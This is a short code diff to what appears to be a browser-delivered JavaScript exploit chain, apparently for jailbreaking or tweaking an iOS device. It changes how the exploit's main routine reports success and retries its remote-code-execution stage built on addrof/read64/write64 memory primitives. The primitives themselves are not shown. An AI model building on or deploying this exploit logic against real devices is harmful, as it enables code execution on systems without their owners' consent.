@@ -9482,14 +9482,15 @@ const device_chipset = {
         }
         setup_stage1_prim(p_rce);
         setup_stage2_prim();
+        return true;
     } catch (e) {
         if (e instanceof TryAgainError) {
             print('failed _make_rw ... retry: ' + (e && e.stack ? e.stack : e));
+            return false;
         } else {
             throw e;
         }
     }
-    return p_rce;
 }
 async function main() {
     print("begin");
@@ -9497,7 +9498,7 @@ async function main() {
         return await _aarw_main();
     } catch (e) {
         print('_aarw_main: error: ' + e);
-        return null;
+        return false;
     }
 }
   const rce_begin = Date.now();
@@ -10307,11 +10308,9 @@ async function main() {
             if (!isFinite(globalThis.__ls_sbx0_fallback_start)) globalThis.__ls_sbx0_fallback_start = 0;
 	            print("inside stage1_rce from worker, mode=" + globalThis.__ls_run_mode + " tweaks=" + globalThis.__ls_tweaks + " level=" + globalThis.__powercuff_level + " sbc=" + globalThis.__sbc_dock_icons + "/" + globalThis.__sbc_hs_cols + "x" + globalThis.__sbc_hs_rows + " statbar=" + globalThis.__sbc_statbar + " hideLabels=" + globalThis.__sbc_hide_labels + " mgpatcherMode=" + globalThis.__mgpatcher_mode + " site=" + globalThis.__ls_site_host + globalThis.__ls_site_path);
             (async () => {
-              let p_temp = null;
 	              const maxRetries = 3;
               for (let attempt = 0; attempt < maxRetries; attempt++) {
-                p_temp = await main();
-                if (p_temp && p_temp.addrof && p_temp.read64 && p_temp.write64)
+                if (await main() === true)
                   return;
                 print("Failed rce, retry " + (attempt + 1) + "/" + maxRetries);
               }
